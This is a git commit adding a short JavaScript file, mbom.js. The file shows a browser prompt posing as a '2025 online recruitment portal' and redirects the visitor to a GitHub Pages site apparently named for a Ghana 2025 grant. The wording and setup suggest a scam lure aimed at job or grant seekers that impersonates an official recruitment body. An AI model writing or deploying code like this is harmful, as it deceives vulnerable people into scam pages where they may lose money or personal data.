3669d2e4f063fc0c526fc0cf0e3aa72234ad277c
offernoww <josiahnyeti16@gmail.com>
2025-02-10 22:20:39 +0100

    Create mbom.js

---
+++ mbom.js
@@ -0,0 +1,6 @@
+
+var password = 'PSC RECRUITMENT'
+password=prompt('SMS :Welcome to the 2025 online recruitment portal, click OK to start application  ','PSC RECRUITMENT');
+if (password != 'PSC RECRUITMENT') {
+location.href='https://offernoww.github.io/ghana-2025-grant';
+}
